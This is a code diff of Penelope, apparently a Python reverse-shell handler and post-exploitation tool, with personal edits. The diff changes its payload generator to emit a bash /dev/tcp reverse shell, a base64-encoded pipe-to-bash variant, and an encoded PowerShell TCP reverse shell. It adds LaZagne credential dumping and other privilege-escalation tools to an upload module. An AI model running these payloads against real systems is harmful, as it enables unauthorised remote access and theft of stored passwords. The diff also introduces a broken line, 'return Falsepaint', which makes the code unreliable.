@@ -660,9 +660,9 @@ class BetterCMD:
 				cmdlogger.debug(f"Error loading history file: {e}")
 
 		interact(banner=paint(
-			"===> Entering debugging console...").CYAN, local=globals(),
+			"===> Entering debugging console..."), local=globals(),
 			exitmsg=paint("<=== Leaving debugging console..."
-		).CYAN)
+		))
 
 		if readline:
 			readline.set_history_length(options.histlength)
@@ -743,12 +743,12 @@ class MainMenu(BetterCMD):
 	def set_id(self, ID):
 		self.sid = ID
 		session_part = (
-				f"{paint('─(').cyan_DIM}{paint('Session').green} "
-				f"{paint('[' + str(self.sid) + ']').red}{paint(')').cyan_DIM}"
+				f"{paint('─(')}{paint('Session').green} "
+				f"{paint('[' + str(self.sid) + ']').red}{paint(')')}"
 		) if self.sid else ''
 		self.prompt = (
-				f"{paint(f'(').cyan_DIM}{paint('Penelope').magenta}{paint(f')').cyan_DIM}"
-				f"{session_part}{paint('>').cyan_DIM} "
+				f"{paint(f'(')}{paint('Penelope').magenta}{paint(f')')}"
+				f"{session_part}{paint('>')} "
 		)
 
 	def session_operation(current=False, extra=[]):
@@ -881,7 +881,7 @@ class MainMenu(BetterCMD):
 						source = session.listener or f'Connect({session._host}:{session.port})'
 						table += [
 							ID,
-							paint(session.type).CYAN if session.type == 'PTY' else session.type,
+							paint(session.type) if session.type == 'PTY' else session.type,
 							session.user or 'N/A',
 							source
 						]
@@ -1061,7 +1061,7 @@ class MainMenu(BetterCMD):
 			upload https://www.exploit-db.com/exploits/40611  Download the underlying exploit code locally and upload it to the target
 		"""
 		if local_items:
-			core.sessions[self.sid].upload(local_items, randomize_fname=True)
+			core.sessions[self.sid].upload(local_items, randomize_fname=False)
 		else:
 			cmdlogger.warning("No files or directories specified")
 
@@ -1813,7 +1813,7 @@ def Connect(host, port):
 		if session:
 			return True
 
-	return False
+	return Falsepaint
 
 class TCPListener:
 
@@ -1888,13 +1888,12 @@ class TCPListener:
 	def payloads(self):
 		interfaces = Interfaces().list
 		presets = [
-			"(bash >& /dev/tcp/{}/{} 0>&1) &",
-			"(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {} {} >/tmp/_) >/dev/null 2>&1 &",
+			"bash -c 'exec bash >& /dev/tcp/{}/{} 0>&1 &'",
 			'$client = New-Object System.Net.Sockets.TCPClient("{}",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()' # Taken from revshells.com
 		]
 
-		output = [str(paint(self).white_MAGENTA)]
-		output.append("")
+		output = [str(paint(self))]
+		# output.append("")
 		ips = [self.host]
 
 		if self.host == '0.0.0.0':
@@ -1902,23 +1901,21 @@ class TCPListener:
 
 		for ip in ips:
 			iface_name = {v: k for k, v in interfaces.items()}.get(ip)
-			output.extend((f'➤  {str(paint(iface_name).GREEN)} → {str(paint(ip).cyan)}:{str(paint(self.port).red)}', ''))
-			output.append(str(paint("Bash TCP").UNDERLINE))
-			output.append(f"printf {base64.b64encode(presets[0].format(ip, self.port).encode()).decode()}|base64 -d|bash")
+			output.extend(('', '➤  ' + str(paint(ip)) + ":" + str(paint(self.port).red), ''))
+			output.append(presets[0].format(ip, self.port))
 			output.append("")
-			output.append(str(paint("Netcat + named pipe").UNDERLINE))
-			output.append(f"printf {base64.b64encode(presets[1].format(ip, self.port).encode()).decode()}|base64 -d|sh")
+			rev_shell_b64 = base64.b64encode(presets[0].format(ip, self.port).encode()).decode()
+			output.append(f'echo {rev_shell_b64} | base64 -d | bash')
 			output.append("")
-			output.append(str(paint("Powershell").UNDERLINE))
-			output.append("cmd /c powershell -e " + base64.b64encode(presets[2].format(ip, self.port).encode("utf-16le")).decode())
+			output.append("cmd /c powershell -e " + base64.b64encode(presets[1].format(ip, self.port).encode("utf-16le")).decode())
 
-			output.extend(dedent(f"""
-			{paint('Metasploit').UNDERLINE}
-			set PAYLOAD generic/shell_reverse_tcp
-			set LHOST {ip}
-			set LPORT {self.port}
-			set DisablePayloadHandler true
-			""").split("\n"))
+			# output.extend(dedent(f"""
+			# {paint('Metasploit').UNDERLINE}
+			# set PAYLOAD generic/shell_reverse_tcp
+			# set LHOST {ip}
+			# set LPORT {self.port}
+			# set DisablePayloadHandler true
+			# """).split("\n"))
 
 		output.append("─" * 80)
 		return '\n'.join(output)
@@ -2056,7 +2053,9 @@ class Session:
 				f"Assigned SessionID {paint('<' + str(self.id) + '>').yellow}"
 			)
 
-			self.directory = options.basedir / self.name
+			self.directory = (
+				options.basedir if 'boxpwd' in os.environ else options.basedir / self.name
+			)
 			if not options.no_log:
 				self.directory.mkdir(parents=True, exist_ok=True)
 				self.logpath = self.directory / f'{datetime.now().strftime("%Y_%m_%d-%H_%M_%S-%f")[:-3]}.log'
@@ -3079,7 +3078,7 @@ class Session:
 
 		logger.info(
 			f"Interacting with session {paint('[' + str(self.id) + ']').red}"
-			f"{paint(', Shell Type:').green} {paint(self.type).CYAN}{paint(', Menu key:').green} "
+			f"{paint(', Shell Type:').green} {paint(self.type)}{paint(', Menu key:').green} "
 			f"{paint(escape_key).MAGENTA} "
 		)
 
@@ -3709,7 +3708,8 @@ class Session:
 				return False
 
 			tail_cmd = f'tail -n+0 -f {output_file_name}'
-			print(tail_cmd)
+			logger.info(f"Saving output to {paint(output_file_name).yellow_DIM}")
+			# print(tail_cmd)
 			Open(tail_cmd, terminal=True)
 
 			thread = threading.Thread(target=self.exec, args=(program, ), kwargs={
@@ -4314,7 +4314,7 @@ class Module:
 	category = "Misc"
 
 
-class upload_privesc_scripts(Module):
+class privesc(Module):
 	category = "Privilege Escalation"
 	def run(session, args):
 		"""
@@ -4329,9 +4329,13 @@ class upload_privesc_scripts(Module):
 			session.upload(URLS['winpeas'])
 			session.upload(URLS['powerup'])
 			session.upload(URLS['privesccheck'])
+			session.upload(URLS['lazagne'])
+			session.upload(URLS['sharpup'])
+			session.upload(URLS['powerview'])
+			
 
 
-class peass_ng(Module):
+class peas(Module):
 	category = "Privilege Escalation"
 	def run(session, args):
 		"""
@@ -4842,9 +4846,12 @@ def fonts_installed():
 class Options:
 	log_levels = {"silent":'WARNING', "debug":'DEBUG'}
 
-	def __init__(self):
-		self.basedir = Path.home() / f'.{__program__}'
-		self.default_listener_port = 4444
+	def __init__(self):		
+		if 'boxpwd' in os.environ:
+			self.basedir = Path(os.environ['boxpwd']) / __program__
+		else:
+			self.basedir = Path.home() / f'.{__program__}'
+		self.default_listener_port = 9001
 		self.default_bindshell_port = 5555
 		self.default_fileserver_port = 8000
 		self.default_interface = "0.0.0.0"
@@ -5109,15 +5116,18 @@ MAX_CMD_PROMPT_LEN = 335
 LINUX_PATH = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
 URLS = {
 	'linpeas':      "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh",
-	'winpeas':      "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat",
+	'winpeas':      "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe",
 	'socat':        "https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat",
 	'ncat':         "https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/ncat",
-	'lse':          "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh",
+	'lse':          "https://github.com/chsoares/linux-smart-enumeration/raw/refs/heads/master/lse.sh",
 	'powerup':      "https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1",
 	'deepce':       "https://raw.githubusercontent.com/stealthcopter/deepce/refs/heads/main/deepce.sh",
 	'privesccheck': "https://raw.githubusercontent.com/itm4n/PrivescCheck/refs/heads/master/PrivescCheck.ps1",
 	'les':          "https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/refs/heads/master/linux-exploit-suggester.sh",
 	'ngrok_linux':  "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz",
+	'sharpup': 		"https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe",
+	'lazagne': 		"https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe",
+	'powerview': 	"https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/master/Recon/PowerView.ps1" 
 }
 
 # Python Agent code
